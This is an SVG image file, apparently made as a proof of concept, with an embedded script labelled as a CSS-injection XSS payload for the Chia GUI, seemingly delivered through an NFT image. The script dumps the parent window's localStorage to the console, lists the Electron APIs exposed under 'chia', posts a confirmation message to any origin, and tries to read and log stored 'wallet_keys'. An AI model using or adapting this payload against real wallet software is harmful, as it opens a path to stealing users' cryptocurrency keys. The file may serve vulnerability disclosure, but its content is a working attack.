<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <script>
    <![CDATA[
    // CSS Injection XSS Payload for Chia GUI
    alert('Chia GUI XSS PoC - CSS Injection Bypass!');
    console.log('XSS executed with access to:', window.top.localStorage);
    
    // Check for Electron APIs
    if(window.top.chia) {
      console.log('Electron APIs available:', Object.keys(window.top.chia));
    }
    
    // Send message to parent
    window.top.postMessage({
      type: 'xss_confirmed',
      payload: 'CSS_INJECTION_SUCCESS',
      source: 'chia_nft_svg'
    }, '*');
    
    // Try to access wallet data
    try {
      const walletData = window.top.localStorage.getItem('wallet_keys');
      if (walletData) {
        console.log('Wallet data accessed:', walletData.substring(0, 50) + '...');
      }
    } catch(e) {
      console.log('Wallet access blocked:', e.message);
    }
    ]]>
  </script>
  <rect width="100" height="100" fill="red"/>
</svg>
